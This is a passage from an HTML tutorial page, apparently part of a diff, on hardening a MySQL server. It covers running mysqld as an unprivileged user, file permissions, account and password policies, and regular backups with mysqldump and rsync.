+<p>If you run MySQL server as root, it has root privilege (e.g., can access all the files in the system). Run MySQL server as an ordinary, unprivileged user. For example, in Ubuntu, a system, unprivileged user called <code>mysql</code> is created to run the MySQL server.</p>
+
+<pre class="color-command">
+<span class="color-comment">// Check the owner of &quot;mysql&quot; process</span>
+$ <strong>ps aux | grep mysql</strong>
+<strong>mysql</strong>  ..... /usr/sbin/mysqld
+
+<span class="color-comment">// Show user &quot;mysql&quot;</span>
+$ <strong>id mysql</strong>
+uid=115(mysql) gid=125(mysql) groups=125(mysql)
+   <span class="color-comment">// user &quot;mysql&quot; belongs to group &quot;mysql&quot; only.</span>
+
+<span class="color-comment">// Check ownerships and permissions of MySQL data directory</span>
+$ <strong>sudo ls -l /var/lib/mysql</strong>
+-rw-rw---- 1 mysql mysql 18874368 Dec 19 16:11 ibdata1
+-rw-rw---- 1 mysql mysql  5242880 Dec 19 17:00 ib_logfile0
+-rw-rw---- 1 mysql mysql  5242880 Dec 19 17:00 ib_logfile1
+drwx------ 2 mysql mysql     4096 Oct 26 21:49 mysql
+drwx------ 2 mysql mysql     1024 Dec 16 03:49 test
+......
+   <span class="color-comment">// user-owner: mysql
+   // group-owner: mysql
+   // Data sub-directories: list-write-access by &quot;mysql&quot; only.</span></pre>
+
+<p>To specify the owner of the <code>mysql</code> process, you need to configure <code>/etc/mysql/my.cnf</code> as follows:</p>
+
+<pre class="color-example">
+[mysqld]
+user            = mysql
+datadir         = /var/lib/mysql</pre>
+   
+<h5>The MySQL data directory shall be owned and only be accessible by server's account</h5>
+
+<p>As seen in the above example, the data directory is only accessible by the user &quot;mysql&quot;. Other users have no access.</p>
+
+<p>[The location of the data directory is configured in the &quot;<code>datadir</code>&quot; directive of the configuration file &quot;<code>/etc/mysql/my.cnf</code>&quot; as illustrated above.]</p>
+
+<p>To set the ownerships and permissions:</p>
+<pre class="color-command">
+$ cd /path/to/MySQL-datadir
+$ <strong>sudo chown -R mysql:mysql .</strong>
+    <span class="color-comment">// -R recursive</span>
+    
+$ <strong>sudo chmod -R 700 .</strong>
+    <span class="color-comment">// 700 = rwx --- ---</span></pre>
+
+
+
+<h5>MySQL configuration file shall be properly protected</h5>
+
+<p>The global configuration file <code>/etc/mysql/my.cnf</code> shall be owned by root, with permissions <code>(rw- r-- r--)</code> or <code>644</code>. That is, it is writable by root (or sudo), but readable by the world (both server and client program need to read this configuration). You should be keep confidential data such as password as it is world-readable.</p>
+
+<p>The local configuration files (<code>my.cnf</code> located at data directory) shall be owned by user &quot;mysql&quot; and read-write only by &quot;mysql&quot; (i.e, <code>600</code>).</p>
+
+<p>Remove the <code>test</code> database.</p>
+
+
+<h5>MySQL user accounts</h5>
+
+<ul>
+<li>Remove all anonymous account.</li>
+<li>Password protect MySQL root account.</li>
+<li>Grant only the necessary privileges (up to table-level or column-level) to My
+SQL user account. [TODO] example.</li>
+</ul>
+
+<h5>Password Policies</h5>
+
+<ul>
+<li>All accounts shall be password protected.</li>
+<li>Password shall be stored in hash, so that even the administrator cannot see clear-text password.</li>
+<li>Add a salt to the password hash, which is stored together with the password hash. Different user shall have a different salt, so that the hash is different even if the password is identical.</li>
+</ul>
+
+<h5>Backup Regularly</h5>
+<p>Use a <code>cron</code> job (configured in <code>crontab</code>)to back up the database regularly, and preferably <code>rsync</code> or <code>scp</code> to another server.</p>
+<pre class="color-command">
+$ mysqldump -u root -p databasename &gt; backup.sql
+$ rsync -azv --rsh=ssh src dest
+   // over the ssh connection
+</pre>
+<p>Do incremental backup. [TODO]</p>
+
+
+<h4>[TODO] Auditing</h4>
+
+<a class="references" href="../howto/References.html#mysql">Link to MySQL References &amp; Resources</a>
+
+</div> <!-- End the content-main division -->
+
+<div id="content-footer">
+<p>Latest version tested: MySQL 5.5<br />
+Last modified: October, 2012</p>
+</div>
+
+</div>  <!-- End the wrap-inner division -->
+
+<!-- footer filled by JavaScript -->
+<div id="footer" class="header-footer"><p>&nbsp;</p></div>
+
+</div>  <!-- End the wrap-outer division -->
+</body>
+</html>
